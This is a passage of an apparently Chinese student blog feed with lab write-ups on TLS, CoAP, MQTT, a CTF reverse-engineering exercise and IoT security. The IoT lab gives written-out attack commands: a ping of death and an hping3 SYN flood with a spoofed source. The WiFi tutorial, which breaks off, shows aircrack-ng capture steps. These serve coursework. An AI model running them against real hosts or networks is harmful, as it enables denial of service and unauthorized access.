客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。（可能在加密消息中，未确认）</p><p>客户端收到服务器所有响应消息后，首先验证服务器证书。如果证书不是可信机构颁布、或者证书中的域名与实际域名不一致、或者证书已经过期，就会向访问者显示一个警告，由其选择是否还要继续通信。</p><p>如果证书没有问题，客户端就会从证书中取出服务器的公钥，即server key exchange消息中携带的pubkey值。然后，根据根据已经收到的三个随机数计算书加密密钥，对握手信息进行加密通信，然后向服务器发送上面抓包中三项信息内容。</p><p>​      至此，整个握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的HTTP协议，只不过用”会话密钥”加密数据内容。</p><p>五 实验体会（不少于300字）</p><p>​      TLS（Transport Layer Security，安全传输层)，TLS是建立在传输层TCP协议之上的协议，服务于应用层，它的前身是SSL（Secure Socket Layer，安全套接字层），它实现了将应用层的报文进行加密后再交由TCP进行传输的功能。</p><p>​      TLS协议主要解决如下三个网络安全问题。</p><p>1、保密(message privacy)，保密通过加密encryption实现，所有信息都加密传输，第三方无法嗅探；</p><p>2、完整性(message integrity)，通过MAC校验机制，一旦被篡改，通信双方会立刻发现；</p><p>3、认证(mutual authentication)，双方认证,双方都可以配备证书，防止身份被冒充；</p><p>下面是TLS的握手过程。详细步骤上面也说过了。</p><p><img src="https://s2.ax1x.com/2019/06/30/Z13Gz4.png" alt="Z13Gz4.png"></p><p>Client1：TLS版本号 + 所支持加密套件列表 + 希望使用的TLS选项 </p><p>Server1：选择一个客户端的加密套件 + 自己的公钥 + 自己的证书 + 希望使用的TLS选项 +（要求客户端证书） </p><p>Client2：（自己的证书） + 使用服务器公钥和协商的加密套件加密一个对称密钥 </p><p>Server2：使用私钥解密出对称密钥后，发送的加密的Finish消息，表明完成握手</p><p>任何事物都是有利有弊，引入TLS机制固然是能够保证安全，但却在TCP握手和HTTP通信之间，多加了两个往返的TLS握手过程。</p><p>安全问题：</p><p>​      可能存在中间人攻击。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;做了很久的实验，一直没能成功，最后还是down的大佬的源码，侵删。</summary>
    
    
    
    <category term="Other" scheme="http://example.com/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>物联网应用层coap协议</title>
    <link href="http://example.com/2019/06/18/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%B1%82coap%E5%8D%8F%E8%AE%AE/"/>
    <id>http://example.com/2019/06/18/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%BA%94%E7%94%A8%E5%B1%82coap%E5%8D%8F%E8%AE%AE/</id>
    <published>2019-06-18T07:53:30.000Z</published>
    <updated>2021-05-23T07:31:53.841Z</updated>
    
    <content type="html"><![CDATA[<p>CoAP(Constrained Application Protocol, 受限应用协议)协议是一种在低功耗低速率的设备上实现物联网通信的应用层协议。<span id="more"></span>其采用UDP协议支撑，发送和接收数据可以异步，数据包头采用二进制压缩，对低功耗低速率的网络有很好的适应能力。CoAP协议非常的小巧，最小的数据包仅为4字节。CoAP适用于低功耗受限设备，一个内存为20KB的单片机就可以实现CoAP服务器或客户端。本实验旨在利用工具对CoAP协议基本工作机制进行验证分析，并分析其可能的安全隐患。</p><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><p>（1）实验要求掌握CoAP的基本原理。</p><p>（2）用Wireshark等协议分析软件分析CoAP协议过程。</p><p>（3）学会用Node.js或Python快速构建CoAP通信验证程序。</p><h4 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h4><p>   注意构建一个局域网，模拟CoAP服务端、客户端，运用Wireshark分析客户端和服务端上的协议工作。</p><h4 id="过程及有关程序代码"><a href="#过程及有关程序代码" class="headerlink" title="过程及有关程序代码"></a>过程及有关程序代码</h4><p>服务器代码:</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> coap    = <span class="built_in">require</span>(<span class="string">&#x27;coap&#x27;</span>) </span><br><span class="line">    , server  = coap.createServer()</span><br><span class="line">server.on(<span class="string">&#x27;request&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">      res.end(<span class="string">&#x27;Hello &#x27;</span> + req.url.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">&#125;)</span><br><span class="line">server.listen(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;server started&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>客户端代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> coap  = <span class="built_in">require</span>(<span class="string">&#x27;coap&#x27;</span>) </span><br><span class="line">    , req   = coap.request(<span class="string">&#x27;coap://127.0.0.1/client&#x27;</span>)</span><br><span class="line">req.on(<span class="string">&#x27;response&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">  res.pipe(process.stdout)</span><br><span class="line">&#125;)</span><br><span class="line">req.end()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="1、-搭建局域网"><a href="#1、-搭建局域网" class="headerlink" title="1、 搭建局域网"></a>1、 搭建局域网</h5><h5 id="2、开启服务器"><a href="#2、开启服务器" class="headerlink" title="2、开启服务器"></a>2、开启服务器</h5><p><img src="https://s2.ax1x.com/2019/06/18/VqbIjf.png" alt="VqbIjf.png"></p><h5 id="3、-客户端请求连接，服务器返回信息"><a href="#3、-客户端请求连接，服务器返回信息" class="headerlink" title="3、 客户端请求连接，服务器返回信息"></a>3、 客户端请求连接，服务器返回信息</h5><p><img src="https://s2.ax1x.com/2019/06/18/VqbLNj.png" alt="VqbLNj.png"></p><h5 id="4、抓包信息"><a href="#4、抓包信息" class="headerlink" title="4、抓包信息"></a>4、抓包信息</h5><p><img src="https://s2.ax1x.com/2019/06/18/VqqpuT.png" alt="VqqpuT.png"></p><p><img src="https://s2.ax1x.com/2019/06/18/VqqV81.png" alt="VqqV81.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>CoAP是一种应用层协议，它运行于UDP协议之上而不是像HTTP那样运行于TCP之上。HTTP 与 COAP协议都是通过4个请求方法（GET, PUT, POST, DELETE）对服务器端资源进行操作。 两者之间明显的区别在于HTTP是通过文本描述方式描述协议包内容，协议包里面会包含一些空格符，换行符等,协议包可读性很强。而COAP是通过定义 二进制各位段功能来描述协议包内容。 因此COAP协议包大小更小，更紧凑。CoAP协议非常小巧，最小的数据包仅为4字节。但CoAP并不能替代HTTP协议，CoAP只能呢 应用于那些小设备。</p><p>​    CoAP采用与HTTP协议相同的请求响应工作模式。CoAP协议共有4中不同的消息类型。</p><p>CON——需要被确认的请求，如果CON请求被发送，那么对方必须做出响应。</p><p>NON——不需要被确认的请求，如果NON请求被发送，那么对方不必做出回应。</p><p>ACK——应答消息，接受到CON消息的响应。</p><p>RST——复位消息，当接收者接受到的消息包含一个错误，接受者解析消息或者不再关心发送者发送的内容，那么复位消息将会被发送。</p><p><img src="https://s2.ax1x.com/2019/06/18/Vqq7xx.png" alt="Vqq7xx.png"></p><p>这里抓到的包只有CON和ACK，是因为客户端发的包需要服务器响应，所以是CON，而且在传输过程中并未出错，所以没有出现RST复位消息。</p><p>CoAP还有一个比较特殊的地方，那就是它的url。在HTTP的世界中，RESTFul协议由于其简单性和适用性，在WEB应用中越来越受欢迎，这样的道理同样适用于CoAP。一个CoAP资源可以被一个URI所描述，例如一个设备可以测量温度，那么这个温度传感器的URI被描述为：CoAP://machine.address:5683/sensors/temperature。请注意。后面的 temperature，我觉得更像是表示客户端的身份的信息，不知道理解的对不对，就像下你个面这样 。    </p><p><img src="https://s2.ax1x.com/2019/06/18/Vqq15d.png" alt="Vqq15d.png"></p><p><img src="https://s2.ax1x.com/2019/06/18/VqqwVg.png" alt="VqqwVg.png"></p><h5 id="关于COAP的安全问题："><a href="#关于COAP的安全问题：" class="headerlink" title="关于COAP的安全问题："></a>关于COAP的安全问题：</h5><p>  COAP使用DTLS来做安全传输层，该层运行于UDP之上，当前考虑使用DTLS时，需要考虑设备终端资源受限情况， 有些资源有限设备无法运行DTLS安全加密算法。</p><p>做安全加密，需要根据应用场景需要，对应只上报数据，且数据敏感度不高场景，可以不考虑加入安全层。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CoAP(Constrained Application Protocol, 受限应用协议)协议是一种在低功耗低速率的设备上实现物联网通信的应用层协议。</summary>
    
    
    
    <category term="Other" scheme="http://example.com/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>nodejs搭建MQTT服务器</title>
    <link href="http://example.com/2019/05/28/%E7%BC%96%E7%A8%8B/%E6%90%AD%E5%BB%BAMQTT%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://example.com/2019/05/28/%E7%BC%96%E7%A8%8B/%E6%90%AD%E5%BB%BAMQTT%E6%9C%8D%E5%8A%A1%E5%99%A8/</id>
    <published>2019-05-28T08:55:38.000Z</published>
    <updated>2021-05-23T07:31:33.323Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>物联网安全实践四<span id="more"></span></p><p><a href="https://baijiahao.baidu.com/s?id=1608411516249221334&wfr=spider&for=pc">mqtt协议介绍一</a></p><p><a href="https://www.jianshu.com/p/6cf5a4c740f6">mqtt协议介绍二</a></p><p><img src="https://s2.ax1x.com/2019/05/28/Vmsk2q.png" alt="Vmsk2q.png"></p><p>图片来自<a href="https://www.jianshu.com/p/9e74287e3b07">https://www.jianshu.com/p/9e74287e3b07</a></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="安装nodejs"><a href="#安装nodejs" class="headerlink" title="安装nodejs"></a>安装nodejs</h4><p><a href="https://link.jianshu.com/?t=http://nodejs.cn/download/">下载</a>安装即可。</p><h4 id="安装mqtt-js模块"><a href="#安装mqtt-js模块" class="headerlink" title="安装mqtt.js模块"></a>安装mqtt.js模块</h4><p>新建一个文件夹，打开cmd，<code>npm install mqtt --save</code>，这里很有可能能会报错，百度一下就可以解决。</p><p>安装好mqtt.js模块后，文件夹中会多两个文件出来。</p><h4 id="搭建服务器"><a href="#搭建服务器" class="headerlink" title="搭建服务器"></a>搭建服务器</h4><p>mqttserver.js源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mosca = <span class="built_in">require</span>(<span class="string">&#x27;mosca&#x27;</span>);</span><br><span class="line"><span class="comment">//构建自带服务器</span></span><br><span class="line"><span class="keyword">var</span> MqttServer = <span class="keyword">new</span> mosca.Server(&#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">1883</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">//对服务器端口进行配置， 在此端口进行监听</span></span><br><span class="line">MqttServer.on(<span class="string">&#x27;clientConnected&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//监听连接</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;client connected&#x27;</span>, client.id);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 监听MQTT主题消息</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line">MqttServer.on(<span class="string">&#x27;published&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">packet, client</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//当客户端有连接发布主题消息</span></span><br><span class="line">    <span class="keyword">var</span> topic = packet.topic;</span><br><span class="line">    <span class="built_in">console</span>.log(packet);</span><br><span class="line">    <span class="keyword">switch</span> (topic) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;message-publish&#x27;</span>, packet.payload.toString());</span><br><span class="line">            <span class="comment">//MQTT转发主题消息</span></span><br><span class="line">            <span class="comment">//MqttServer.publish(&#123; topic: &#x27;other&#x27;, payload: &#x27;sssss&#x27; &#125;);</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;other&#x27;</span>:</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&#x27;message-123&#x27;</span>, packet.payload.toString());</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">MqttServer.on(<span class="string">&#x27;ready&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//当服务开启时</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;mqtt is running...&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>node mqttserver.js</code>开启服务器</p><p><img src="https://s2.ax1x.com/2019/05/28/VmDdmD.png" alt="VmDdmD.png"></p><p>服务器运行成功。</p><h4 id="开启订阅"><a href="#开启订阅" class="headerlink" title="开启订阅"></a>开启订阅</h4><p>subclient.js源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mqtt = <span class="built_in">require</span>(<span class="string">&#x27;mqtt&#x27;</span>);  </span><br><span class="line"><span class="keyword">var</span> client2 = mqtt.connect(<span class="string">&quot;mqtt://127.0.0.1:1883&quot;</span>);   <span class="comment">//指定服务端地址和端口</span></span><br><span class="line">  </span><br><span class="line">client2.subscribe(<span class="string">&#x27;test&#x27;</span>,&#123;<span class="attr">qos</span>:<span class="number">1</span>&#125;);<span class="comment">//订阅主题为test的消息  </span></span><br><span class="line">  </span><br><span class="line">client2.on(<span class="string">&#x27;message&#x27;</span>,<span class="function"><span class="keyword">function</span>(<span class="params">top,message</span>) </span>&#123;  </span><br><span class="line">    <span class="built_in">console</span>.log(message.toString());  </span><br><span class="line">&#125;);  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>node subclient.js</code>开启订阅</p><h4 id="开启发布"><a href="#开启发布" class="headerlink" title="开启发布"></a>开启发布</h4><p>pubclient.js源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mqtt = <span class="built_in">require</span>(<span class="string">&#x27;mqtt&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> client = mqtt.connect(<span class="string">&#x27;mqtt://127.0.0.1&#x27;</span>); <span class="comment">//连接到服务端</span></span><br><span class="line"><span class="comment">//client.subscribe(&#x27;presence&#x27;);</span></span><br><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> qtt = &#123;&#125;; <span class="comment">//定义消息（可以为字符串、对象等）</span></span><br><span class="line">qtt = <span class="string">&#x27;helloworld&#x27;</span>;</span><br><span class="line"><span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="comment">//3秒钟发送一次 消息到主题 SN69143809293670state 消息为helloworld</span></span><br><span class="line">    client.publish(<span class="string">&#x27;test&#x27;</span>, qtt, &#123; <span class="attr">qos</span>: <span class="number">0</span>, <span class="attr">retain</span>: <span class="literal">true</span> &#125;);  </span><br><span class="line">&#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p><code>node pubclient.js</code>开启发布</p><hr><p>此时，会发现如下结果</p><p>服务器</p><p>[<img src="https://s2.ax1x.com/2019/05/28/Vmrt4s.png" alt="Vmrt4s.png"></p><p>订阅方</p><p><img src="https://s2.ax1x.com/2019/05/28/VmrwvV.png" alt="VmrwvV.png"></p><p>说明mqtt服务器搭建成功。</p><h4 id="实验体会"><a href="#实验体会" class="headerlink" title="实验体会"></a>实验体会</h4><p><strong>讲一下MQTT一个通俗的理解。</strong></p><p>MQTT服务器类似一个公告栏，里面张贴了各种广告。</p><p>张三跑过来说，凡是涉及足球的（/public/TEST/Soccer）的都发给自己（订阅）</p><p>第二天，李四过来贴广告了，主题是（/public/TEST/Soccer），发布的内容是“30号有比赛”</p><p>此时，公告栏（MQTT服务器）会自动发短信给张三，发送的信息为 “30号有比赛”。</p><p><strong>实验流程分析</strong>：</p><p>1、实验中，mqtt服务器上有两个主题的信息test和other</p><p>2、<strong>订阅方</strong>发布一个主题为test的订阅，当mqtt也会得到这个这个主题的信息时，就会发给<strong>订阅方</strong></p><p>3、发布方发布一个主题为test的信息到mqtt服务器</p><p>4、当mqtt服务器得知与<strong>订阅方</strong>相匹配的订阅时，会把这个主题消息的内容发给<strong>订阅方</strong>。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;物联网安全实践四</summary>
    
    
    
    <category term="Other" scheme="http://example.com/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>南邮re逆向writeup</title>
    <link href="http://example.com/2019/05/22/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEre%E9%80%86%E5%90%91writeup/"/>
    <id>http://example.com/2019/05/22/%E5%A4%A7%E5%AD%A6CTF/%E5%8D%97%E9%82%AEre%E9%80%86%E5%90%91writeup/</id>
    <published>2019-05-22T08:27:40.000Z</published>
    <updated>2019-05-22T09:29:11.722Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>被老师嘲讽不会逆向。。。<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Hello-RE"><a href="#Hello-RE" class="headerlink" title="Hello RE"></a>Hello RE</h4><p>tips：</p><blockquote><p>或许你需要去学习下IDA的使用，但是只需要学一点点就能做这题了 PS:IDA里面按R可以把奇怪的数字变成字符串</p><p>格式为<code>flag&#123;*****&#125;</code>包含flag{}提交</p><p>参考资料： 《IDA Pro 权威指南》 各种CTF比赛的逆向部分的writeup</p></blockquote><p>给老人一个1.exe文件，运行一下，结果如下：</p><p><a href="https://imgchr.com/i/V9lFW4"><img src="https://s2.ax1x.com/2019/05/22/V9lFW4.png" alt="V9lFW4.png"></a></p><p>将他放入IDA分析一波，要注意使用32位的，开始用64位的，怎么都看不到伪代码。</p><p>IDA打开之后，按F5查看伪代码，</p><p><img src="https://s2.ax1x.com/2019/05/22/V9l5p4.png" alt="V9l5p4.png"></p><p>居然就得到flag了，tips的提示还没有尝试呢。。</p><p><img src="https://s2.ax1x.com/2019/05/22/V9lz1H.png" alt="V9lz1H.png"></p><h4 id="ReadAsm2"><a href="#ReadAsm2" class="headerlink" title="ReadAsm2"></a>ReadAsm2</h4><p>读汇编是逆向基本功。</p><p>给出的文件是func函数的汇编 main函数如下 输出的结果即为flag，格式为<code>flag&#123;**********&#125;</code>，请连flag{}一起提交</p><p>编译环境为linux gcc x86-64 调用约定为System V AMD64 ABI <strong>请不要利用汇编器，IDA等工具。。这里考的就是读汇编与推算汇编结果的能力</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">  char input[] = &#123;0x0,  0x67, 0x6e, 0x62, 0x63, 0x7e, 0x74, 0x62, 0x69, 0x6d,</span><br><span class="line">                  0x55, 0x6a, 0x7f, 0x60, 0x51, 0x66, 0x63, 0x4e, 0x66, 0x7b,</span><br><span class="line">                  0x71, 0x4a, 0x74, 0x76, 0x6b, 0x70, 0x79, 0x66 , 0x1c&#125;;</span><br><span class="line">  func(input, 28);</span><br><span class="line">  printf(&quot;%s\n&quot;,input+1);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;被老师嘲讽不会逆向。。。</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="re" scheme="http://example.com/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>物联网安全实践二</title>
    <link href="http://example.com/2019/05/15/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E4%BA%8C/"/>
    <id>http://example.com/2019/05/15/%E7%BC%96%E7%A8%8B/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%AE%9E%E8%B7%B5%E4%BA%8C/</id>
    <published>2019-05-15T11:02:57.000Z</published>
    <updated>2021-05-23T07:31:50.263Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>物联网安全实践<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><strong>一 实验目的及要求</strong></p><p>物联网智能设备一般都提供WiFi接入，本实验是在WiFi密码破解基础上进一步对物联网智能设备配置服务开展安全性分析实验。比如智能物联网家居网关、智能家居中的智能插座等，一般都内置Web服务，方便本地登录Web网页开展参数设置。本实验旨在完成物联网智能设备的配置服务的基本安全分析和攻击验证。</p><p><strong>二 实验要求</strong></p><p>（1）实验要求掌握Web服务器的基本原理。</p><p>（2）掌握TCP SYN Flood的原理并实施验证，可选择network攻击软件。</p><p>（3）掌握nmap端口扫描工具的应用。</p><p>（4）开展死亡之ping实验验证。</p><p>（4）学会用Python或Node.js快速构建简单Web服务。</p><p><strong>三 实验基本步骤</strong></p><p>提示：在笔记本电脑构建WiFi热点，模拟物联网智能设备的服务，两个同学构成一个实验小组，小组内相互设置服务，改变IP和端口，开展安全分析和工具。注意在笔记本电脑上构建时用管理员权限运行netsh wlan set hostednetwork mode=allow ssid=wkk key=87654321。用Python或Node.js快速构建简单Web服务。</p><p>1、 构建一个小型局域网，使两台主机在同一网段。</p><p>2、搭建服务器</p><p>3、Nmap扫描端口</p><p>4、死亡之ping</p><p>5、TCP SYN FLOOD攻击</p><p>四 实验过程及有关程序代码</p><p>目标主机 10.3.248.120，攻击主机10.3.39.27</p><p>1、构建一个小型局域网，使两台主机在同一网段。打开手机WIFI热点，两台主机都连接。</p><p>2、 在一台主机开启一个web服务，作为一个服务器。</p><p>使用python搭建的，首先在python的安装目录下，新建一个文件夹</p><p>webserver，打开一个cmd，输入命令<code>python –m SimpleHTTPServer 8888</code>，开启一个web服务器，8888端口</p><p><img src="https://s2.ax1x.com/2019/05/15/E7tvon.png" alt="E7tvon.png"></p><p>测试，创建一个index.html</p><p><a href="https://imgchr.com/i/E7NpWV"><img src="https://s2.ax1x.com/2019/05/15/E7NpWV.png" alt="E7NpWV.png"></a></p><p><img src="https://s2.ax1x.com/2019/05/15/E7N9zT.png" alt="E7N9zT.png"></p><p><img src="https://s2.ax1x.com/2019/05/15/E7NiyF.png" alt="E7NiyF.png"></p><p>3、 nmap扫描端口</p><p>另一台主机nmap 10.3.248.120 –sT扫描</p><p><img src="https://s2.ax1x.com/2019/05/15/E7NmJx.png" alt="E7NmJx.png"></p><p>8888端口是开放的。</p><p>4、死亡之ping</p><p>攻击机输入攻击命令，ping –l 65500 10.3.248.120</p><p>目标主机收到大量ICMP包</p><p><img src="https://s2.ax1x.com/2019/05/15/E7NKSK.png" alt="E7NKSK.png"></p><p>此时，访问目标网站，会无法访问或者出现很大的延迟。</p><p>5、 TCP SYN FLOOD</p><p>利用kali下的hping3工具，攻击主机输入命令<code>hping3 -q -n -a 10.3.39.27 -S -s 53 --keep -p 8888 --flood 10.3.248.120</code></p><p><img src="https://s2.ax1x.com/2019/05/15/E7NMQO.png" alt="E7NMQO.png"></p><p>目标主机收到大量的SYN握手包，此时web服务器再次崩溃，甚至web服务都无法停止，停止攻击之后，一段时间之后才可以停止。</p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;物联网安全实践</summary>
    
    
    
    <category term="Other" scheme="http://example.com/categories/Other/"/>
    
    
  </entry>
  
  <entry>
    <title>kali破解WiFi密码(wpa/wpa2)</title>
    <link href="http://example.com/2019/05/10/%E5%85%B6%E4%BB%96/kali%E7%A0%B4%E8%A7%A3WiFi%E5%AF%86%E7%A0%81-wpa-wpa2/"/>
    <id>http://example.com/2019/05/10/%E5%85%B6%E4%BB%96/kali%E7%A0%B4%E8%A7%A3WiFi%E5%AF%86%E7%A0%81-wpa-wpa2/</id>
    <published>2019-05-10T12:35:44.000Z</published>
    <updated>2019-05-10T13:03:03.884Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>物联网安全实践一<span id="more"></span></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>这个是破解wpa/wpa2的，wep的另找办法，比较简单。</p><h4 id="无线网卡连接"><a href="#无线网卡连接" class="headerlink" title="无线网卡连接"></a>无线网卡连接</h4><p>先要连接USB网卡，点击虚拟机—设置—USB控制器，设置如下，</p><p><img src="https://s2.ax1x.com/2019/05/10/EWFPN4.png" alt="EWFPN4.png"></p><p>查看右下角边框的usb显示，是否连接，未如连接，则点击右键，链接，连接成功如下显示</p><p><a href="https://imgchr.com/i/EWFEg1"><img src="https://s2.ax1x.com/2019/05/10/EWFEg1.png" alt="EWFEg1.png"></a></p><p>还有，保证这个已连接，设置完成。</p><p><img src="https://s2.ax1x.com/2019/05/10/EWFVjx.png" alt="EWFVjx.png"></p><h4 id="无线网卡配置"><a href="#无线网卡配置" class="headerlink" title="无线网卡配置"></a>无线网卡配置</h4><p>连接好之后，通过iwconfig查看无线网卡工作是否正常，下面说明是正常的。</p><p><img src="https://s2.ax1x.com/2019/05/10/EWFMUe.png" alt="EWFMUe.png"></p><h4 id="设置监听模式"><a href="#设置监听模式" class="headerlink" title="设置监听模式"></a>设置监听模式</h4><p>使用aircrack-ng工具的airmon-ng来启动监听模式，在使用前先清理阻碍的进程，命令</p><p><code>airmon-ng check kill</code> </p><p><code>airmon-ng start wlan0</code></p><p><img src="https://s2.ax1x.com/2019/05/10/EWF1Cd.png" alt="EWF1Cd.png"></p><p>当wlan0后面有个mon时，说明monitor监听模式成功启动。</p><p><a href="https://imgchr.com/i/EWFYKP"><img src="https://s2.ax1x.com/2019/05/10/EWFYKP.png" alt="EWFYKP.png"></a></p><h4 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h4><p>使用airodump-ng wlan0mon来扫描网络，如图.之后会开始扫描</p><p><img src="https://s2.ax1x.com/2019/05/10/EWFRVU.png" alt="EWFRVU.png"></p><p>命令参数：</p><blockquote><p>bssid是ap（access 